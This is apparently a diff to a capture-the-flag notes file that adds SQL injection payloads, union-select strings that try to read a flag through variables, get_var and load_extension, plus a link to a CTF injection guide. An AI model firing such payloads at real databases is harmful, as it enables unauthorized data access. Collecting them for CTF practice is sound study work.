@@ -151,4 +151,10 @@ a%'union select load_extension ('./flag.txt')/*
 - a%'union select table_{id}/*-500
 - a%'union select {table_{id}}/* -500
 - a%'union select {id}/* -500
+- a%'union select @flag/*-500
+- a%'union select @@flag/*-500
+- a%'union select get_var('flag')/*-500
+- a%'union select get_var("flag")/*-500
+- a%'union select `2+2/`*-500
 ### https://sites.google.com/site/janbeck/cybersecurity-and-reverse-engineering-fun/ctf-sql-injection
+### loadfile->select it
